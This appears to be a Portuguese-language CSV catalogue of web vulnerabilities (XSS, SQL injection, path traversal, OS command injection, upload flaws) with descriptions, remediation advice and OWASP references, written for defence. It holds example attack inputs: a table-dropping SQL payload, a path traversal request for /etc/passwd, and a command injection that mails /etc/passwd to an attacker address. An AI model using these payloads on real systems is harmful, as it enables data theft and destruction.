+V;;;Cross-Site Scripting - DOM;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•        XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•        XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•        XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•        Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•        Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•        Realizar operações maliciosas na máquina do usuário;•        Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - DOM;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;;;;;;;;;;;;;;;;
+V;;;Cross-Site Scripting - Persistente;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•	XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•	XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•	XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•	Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•	Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•	Realizar operações maliciosas na máquina do usuário;•	Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - Persistente;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Cross-Site Scripting - Refletido;"Os ataques de Cross-Site Scripting (XSS) são um tipo de injeção, na qual scripts maliciosos são injetados na aplicação de forma confiável. Um usuário mal-intencionado pode usar o XSS para enviar um script maliciosos a um usuário desavisado. O navegador do usuário não tem como saber se o script não é confiável e executa o script. As vulnerabilidades de cross-site scripting (XSS) ocorrem quando os dados são inseridos na aplicação por meio de uma fonte não confiável, onde podemos dividir em três tipos:•        XSS baseado em DOM, o conteúdo malicioso é executado como parte da criação do DOM (Document Object Model), sempre que o navegador da vítima analisa a página HTML;•        XSS refletido (Reflected), normalmente é uma manipulação de uma URL válida, que permite mudar a estrutura de uma página HTML e altera as informações no browser do cliente;•        XSS persistente (Stored/armazenado), conteúdo malicioso inserido no banco de dados, através da aplicação, devido a falta de validação das requisições enviadas pelo cliente, do lado do servidor, fazendo com que a cada usuário que acessar a página HTML válida da aplicação, carregue esses dados manipulados e execute um script com uma ação maliciosa. O conteúdo mal-intencionado enviado ao navegador da web geralmente assume a forma de um segmento de JavaScript, mas também pode incluir HTML, Flash ou qualquer outro tipo de código que o navegador executa. Impactos:•        Transmissão de dados privados do usuário, como cookies ou outras informações da sessão;•        Redirecionando da vítima para um ambiente controlado pelo usuário mal-intencionado;•        Realizar operações maliciosas na máquina do usuário;•        Distorção da aplicação vulnerável (Reescrever o conteúdo da página HTML).";-;Cross-Site Scripting - Refletido;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;OWASP - A7 – Cross-site Scripting (XSS);Alto;;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS);https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md;;;;;;;;;;;;;;
+V;;;Manipulação de Parâmetros;O ataque é baseado na possibilidade de alterar parâmetros da aplicação web entre cliente e servidor, com o objetivo de modificar dados como credenciais, IDs, permissões, preços, etc., sendo realizado por um usuário mal-intencionado com o intuito de tentar elevar privilégios de acesso, controle de acesso às áreas da aplicação e arquivos que o mesmo não possui acesso.;-;Manipulação de Parâmetros;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:        _        Campos de formulário;_        Conteúdo de URLs;_        Parâmetros de requisições GET e POST;_        Cabeçalhos HTTP;_        Nomes e valores de cookies;_        Redirecionamentos.Deve-se aplicar os seguintes controles:•        Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•        As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•        Criar uma White list ou black list, sendo:o        White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o        Black list: Lista com os caracteres que devem ser proibidos, como:_        > (maior)_        < (Menor)_        & (e comercial)_        ' (Apóstrofo ou aspas simples)_        """" (Aspas dupla)_        ( ) (Parênteses)_        % (Porcentagem)_        $ (Dólar)_        ~ (Til)_        \ (Barra invertida)_        / (barra)_        | (barra vertical)_        (Espaço em branco)_        ; (ponto e vírgula)_        .. (duplo ponto final)_        … (triplo ponto final)_        Bytes nulos (%00)_        Caracteres de novas linhas (%0d, %0a, \r, \n), _        Caso seja utilizado a extensão UTF-8, deve-se haver representações         alternativas como: %c0%ae%c0%ae/._        Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_        Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLsEm conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•        X-Frame-Options: SAMEORIGIN•        X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;MEDIUM;;;;;;;;;;;;;;;;;
+V;;;Negação de Serviço por tempo de execução de parâmetro;A aplicação está suscetível a negação de serviço por meio do envio de requisições manipuladas através das variáveis da aplicação. Quando esta vulnerabilidade é explorada, a aplicação torna-se indisponível até que o serviço seja reiniciado.;-;Negação de Serviço por tempo de execução de parâmetro;"Deve-se realizar as seguintes ações:1. Avaliar qual o componente que ocasionou a interrupção do serviço, revisando as funções de dados e os parâmetros de entrada a fim de garantir o devido tratamento das informações submetidas pelo usuário;2. Devem ser redirecionadas para uma página de erro padrão;3. Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs4. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;;;;;;;;;;;;;;;;
+V;;;Permissão excessiva para upload;Quando é permitido aos usuários a transferência de arquivos dos seus computadores para os servidores via uma aplicação Web, é de extrema importância que se faça as verificações necessárias para impedir o mau uso dessa funcionalidade:;-;Permissão excessiva para upload;"Deve-se aplicar os seguintes controles:- Não permitir a sobreposição de arquivos de configuração, códigos fontes, arquivos HTML ou imagens do sistema;- Impedir o envio dos arquivos que podem ser executados pelo servidor de aplicação, como JSP, PHP, CFM, ASPX ou ASP;- Definir um tamanho limite para o upload de arquivos e também restringir a quantidade limite de arquivos por usuário;- Validar o cabeçalho “Content-Type”;- Impedir a alteração do diretório destino;- Recomendável disponibilizar o destino do upload em uma partição separada do sistema e dos logs.•        Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•        As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•        Criar uma White list ou black list, sendo:o        White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o        Black list: Lista com os caracteres que devem ser proibidos, como:_        > (maior)_        < (Menor)_        & (e comercial)_        ' (Apóstrofo ou aspas simples)_        """" (Aspas dupla)_        ( ) (Parênteses)_        % (Porcentagem)_        $ (Dólar)_        ~ (Til)_        \ (Barra invertida)_        / (barra)_        | (barra vertical)_        (Espaço em branco)_        ; (ponto e vírgula)_        .. (duplo ponto final)_        … (triplo ponto final)_        Bytes nulos (%00)_        Caracteres de novas linhas (%0d, %0a, \r, \n), _        Caso seja utilizado a extensão UTF-8, deve-se haver representações         alternativas como: %c0%ae%c0%ae/._        Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_        Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•        X-Frame-Options: SAMEORIGIN•        X-XSS-Protection: 1; mode=block";Validação de dados;Upload seguro de arquivos ;;HIGH;;https://www.owasp.org/index.php/Unrestricted_File_Upload;;;;;;;;;;;;;;;
+V;;;SQL Injection;"Este ataque consiste da inserção ou ""injeção"" de comandos SQL via entrada de dados da aplicação. Através destes comandos é possível ler os dados, inclusive dados sensíveis, no banco de dados, modificar dados (inserir, atualizar e apagar), executar operações administrativas (ex: apagar tabelas, reiniciar a base), recuperar conteúdos de arquivos existentes no banco de dados e em alguns casos executar comandos no sistema operacional.Caso os dados sejam concatenados da maneira incorreta, como por exemplo:var         query = “SELECT * FROM usuarios WHERE nome = ‘” +         dadoVindoDoUsuario + “’”;Em uma requisição de um usuário bem-intencionado, a chamada sairia da seguinte maneira:var query = SELECT * FROM usuarios WHERE nome = ‘joao’;Em uma requisição mal-intencionada, ao invés de “joao” o usuário enviaria “’;drop table usuarios;--” e a chamada se tornaria a seguinte:var         query = SELECT * FROM usuarios WHERE nome =’’;drop table         usuarios;--’;";-;SQL Injection;"Para que não ocorram injeções SQL bem-sucedidas, é preciso utilizar consultas parametrizadas no banco, tratando os dados inseridos na consulta como realmente um dado.A maioria dos bancos de dados e plataformas fornecem componentes para tratar entradas não confiáveis. Sendo que em uma pseudolinguagem, o tratamento se daria da seguinte maneira:var sql = “SELECT * FROM usuarios WHERE login = ? and senha = ?”;banco.setParametro(“login”, loginVindoDoUsuario);banco.setParametro(“senha”, senhaVindaDoUsuario);banco.executaConsulta(sql);";Validação de dados;Validação de instruções SQL;OWASP - A6 – Security Misconfiguration;Crítico;;https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet;;;;;;;;;;;;;;
+V;;;Validação de Entrada de Dados Inadequada;A aplicação não valida ou valida incorretamente a entrada de dados submetidos nos formulários, permitindo a um usuário mal-intenionado a manipulação de dados afim de causar comportamentos inesperados na aplicação.;-;Validação de Entrada de Dados Inadequada;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;http://www.owasp.org/index.php/Data_Validation;;;;;;;;;;;;;;;
+V;;;Path Traversal;"Quando for utilizar manipulação de arquivos do servidor para o usuário, ou seja, quando houver chamadas no sistema para a exibição ou transferência de arquivos, é recomendável não permitir o input de dados a partir do usuário.Não deve ser permitido que o usuário escreva algum ponto do path do caminho do arquivo, o sistema internamente deve direcionar o usuário ao diretório correto do arquivo.Uma das formas de identificar possíveis pontos de falha, é buscando na aplicação funcionalidades utilizadas para armazenar arquivos no servidor, como planilhas, imagens e documentos.Suponha que a aplicação possua uma funcionalidade de download de PDFs na URL:www[.]exemplo[.]com[.]br/documentos?arquivo=cotacao2753201.pdfCaso não haja a devida validação, um usuário mal-intencionado poderá enviar uma requisição no seguinte path e ter acesso a um arquivo restrito do servidor:www[.]exemplo[.]com[.]br/documentos?arquivo=../../../../etc/passwdEsta falha permite a livre navegação através da estrutura de diretórios do servidor, podendo este servidor ser de qualquer sistema operacional.";-;Path Traversal;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;https://www.owasp.org/index.php/File_System#Path_traversal;https://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize();;;;;;;;;;;;;;
+;;;Headers - X-XSS-Protection não está habilitado;;;;;;;;;;https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers;;;;;;;;;;;;;;;
+V;;;Injeção de comandos de Sistema Operacional;"Vulnerabilidade comum em scripts CGI, Perl e PHP, que visa manipular parâmetros para a execução de códigos no sistema operacional que está no contexto da aplicação.Suponha que uma aplicação que envia um e-mail contém a linha abaixo, onde ‘email’ é o parâmetro enviado pelo usuário, e com este parâmetro, a aplicação encaminha diretamente para a chamada do sistema sem nenhum tipo de filtragem:_        system(“mail         “ + $_GET{‘email’} + “ -s ‘Email enviado pelo sistema’ <         /tmp/text”         , $return);Sendo assim, o usuário preenche o campo com o parâmetro e-mail da seguinte forma:_        --help;         mail attack@atacante.xyz -s ‘arquivo de usuario’ <         /etc/passwd #Então o comando gerado no sistema seria o envio de um e-mail com o conteúdo do arquivo /etc/passwd para o usuário mal-intencionado:mail         --help; mail attack@atacante.xyz -s ‘arquivo de usuario’ <         /etc/passwd # -s ‘Email enviado pelo sistema’ < /tmp/texto";Em caso de input do usuário, este deve ser validado, não permitindo nenhum caractere que não esteja dentro do escopo do arquivo. É recomendável utilizar normalize() antes da exposição do arquivo para o usuário.;Injeção de comandos de Sistema Operacional;"É recomendável identificar todas as fontes de dados e mapear todas as entradas de dados existentes na aplicação, aplicando controle de validação de dados, como:	_	Campos de formulário;_	Conteúdo de URLs;_	Parâmetros de requisições GET e POST;_	Cabeçalhos HTTP;_	Nomes e valores de cookies;_	Redirecionamentos.Deve-se aplicar os seguintes controles:•	Validar as entradas de dados inseridos por usuários para não aceitar caracteres e expressões não esperadas pela aplicação, baseado nos seguintes requisitos:•	As validações devem ser feitas do lado do servidor e nunca através de tecnologias como javascript do lado do cliente;•	Criar uma White list ou black list, sendo:o	White list: Lista com os caracteres permitidos, ex: número de telefone pode incluir apenas dígitos de 0 a 9;o	Black list: Lista com os caracteres que devem ser proibidos, como:_	> (maior)_	< (Menor)_	& (e comercial)_	' (Apóstrofo ou aspas simples)_	"""" (Aspas dupla)_	( ) (Parênteses)_	% (Porcentagem)_	$ (Dólar)_	~ (Til)_	\ (Barra invertida)_	/ (barra)_	| (barra vertical)_	(Espaço em branco)_	; (ponto e vírgula)_	.. (duplo ponto final)_	… (triplo ponto final)_	Bytes nulos (%00)_	Caracteres de novas linhas (%0d, %0a, \r, \n), _	Caso seja utilizado a extensão UTF-8, deve-se haver representações 	alternativas como: %c0%ae%c0%ae/._	Variações codificadas das sintaxes acima: %3c %3e %26 %27 %22 %28 %29 %25 %24 %7e %5c, %7c, %20, %3b, %0a, %2e%2e, %2e%2e%2e_	Caracteres não-ASCII (isto é, tudo acima de 128 na codificação ISO-8859-1) não são permitidos em URLs2. Em conjunto a validação dos dados também se recomenda habilitar os seguintes controles no servidor web•	X-Frame-Options: SAMEORIGIN•	X-XSS-Protection: 1; mode=block";Validação de dados;Validação de dados de entrada no servidor;;;;https://www.owasp.org/index.php/Command_Injection;;;;;;;;;;;;;;;
+V;;;Cadastros de usuário sem validação;Caso o sistema que permite o cadastro de usuários, deve exigir um e-mail válido, além disso, é uma boa prática que o cadastro seja feito em duas etapas, sendo a primeira etapa a solicitação do nome, e-mail e outras informações básicas, enquanto a segunda etapa compreende o envio de um e-mail para o usuário contendo um link para a continuação do cadastro. Caso o usuário seja cadastrado, o e-mail que será enviado deve informá-lo que ele já está cadastrado no sistema. Essa informação deve ser enviada unicamente no e-mail, impossibilitando a descoberta de usuários válidos no sistema. ;-;Cadastros de usuário sem validação;Caso o sistema que permite o cadastro de usuários, deve exigir um e-mail válido, além disso, é uma boa prática que o cadastro seja feito em duas etapas, sendo a primeira etapa a solicitação do nome, e-mail e outras informações básicas, enquanto a segunda etapa compreende o envio de um e-mail para o usuário contendo um link para a continuação do cadastro. Caso o usuário seja cadastrado, o e-mail que será enviado deve informá-lo que ele já está cadastrado no sistema. Essa informação deve ser enviada unicamente no e-mail, impossibilitando a descoberta de usuários válidos no sistema. ;Gerenciamento de Acessos;Mecanismo de cadastro;;;;;;;;;;;;;;;;;;;
+V;;;Funcionalidades ofuscadas;"A utilização de funcionalidades ofuscadas como segurança não é considerada uma boa prática.Não se deve esperar que, apenas por ser servida a partir de uma URL de difícil previsibilidade (ou por estar, de alguma forma, ofuscada) uma determinada função nunca será descoberta por um usuário mal-intencionado. Trata-se de segurança por obscuridade, e que a doutrina recomenda que só deve ser utilizada como coadjuvante.O servidor deve controlar na sessão do usuário todos os critérios de acesso, alçadas e autorizações que o usuário possui.Deve-se ter em mente que o usuário mal-intencionado pode estar observando o tráfego de rede entre uma das vítimas e o servidor ou ter acesso, possivelmente indevido, aos logs de acesso do servidor de aplicações, o que seria informação suficiente para viabilizar um ataque.";-;Funcionalidades ofuscadas;"A utilização de funcionalidades ofuscadas como segurança não é considerada uma boa prática.Não se deve esperar que, apenas por ser servida a partir de uma URL de difícil previsibilidade (ou por estar, de alguma forma, ofuscada) uma determinada função nunca será descoberta por um usuário mal-intencionado. Trata-se de segurança por obscuridade, e que a doutrina recomenda que só deve ser utilizada como coadjuvante.O servidor deve controlar na sessão do usuário todos os critérios de acesso, alçadas e autorizações que o usuário possui.Deve-se ter em mente que o usuário mal-intencionado pode estar observando o tráfego de rede entre uma das vítimas e o servidor ou ter acesso, possivelmente indevido, aos logs de acesso do servidor de aplicações, o que seria informação suficiente para viabilizar um ataque.";Desenvolvimento Seguro;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;
